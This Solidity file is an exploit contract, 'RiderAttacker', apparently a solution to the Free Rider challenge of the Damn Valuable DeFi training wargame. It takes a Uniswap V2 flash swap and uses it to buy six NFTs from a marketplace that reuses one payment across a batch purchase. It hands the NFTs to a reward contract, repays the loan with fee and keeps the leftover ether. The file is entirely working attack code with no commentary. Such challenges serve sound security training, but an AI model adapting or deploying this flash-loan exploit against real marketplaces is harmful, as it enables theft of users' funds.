// SPDX-Licence-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Pair {
  function token0() external view returns (address);
  function token1() external view returns (address);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IWETH {
    function withdraw(uint256 wad) external;
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract RiderAttacker is IERC721Receiver {

    IUniswapV2Pair public uniswap;
    FreeRiderNFTMarketplace public marketplace;
    DamnValuableNFT public nft;
    address public receiver;
    address public rewardContract;

    constructor(
        address _uniswap,
        address payable _marketplace,
        address _nft,
        address _rewardContract
    ) {
        uniswap = IUniswapV2Pair(_uniswap);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        nft = DamnValuableNFT(_nft);
        receiver = msg.sender;
        rewardContract = _rewardContract;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack() public {
        // nft.setApprovalForAll(address(marketplace), true);
        // bytes memory data = abi.encode(receiver, msg.sender);
        uniswap.swap(20 ether, 0, address(this), hex"00");
    }

    function uniswapV2Call(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external {
        // if (msg.sender != address(uniswap)) revert InvalidSender();
        // if (_sender != address(this)) revert InvalidSender();

        IWETH weth = IWETH(uniswap.token0());
        weth.withdraw(20 ether);
        
        uint256[] memory nftIds = new uint256[](6);
        for(uint8 i=0; i<6;) {
            nftIds[i] = i;
            ++i;
        }

        marketplace.buyMany{value: 15 ether}(nftIds);
        marketplace.token().setApprovalForAll(address(marketplace), true);

        for (uint8 i=0; i<6;) {
            nft.safeTransferFrom(address(this), rewardContract, i, abi.encode(receiver));
            ++i;
        }

        uint256 fee = ((20 ether * 3) / uint256(997)) + 1;
        weth.deposit{value: 20 ether + fee}();
        weth.transfer(address(uniswap), 20 ether + fee);

        payable(receiver).transfer(address(this).balance);
    }

    receive() external payable {}

    fallback() external payable {}
}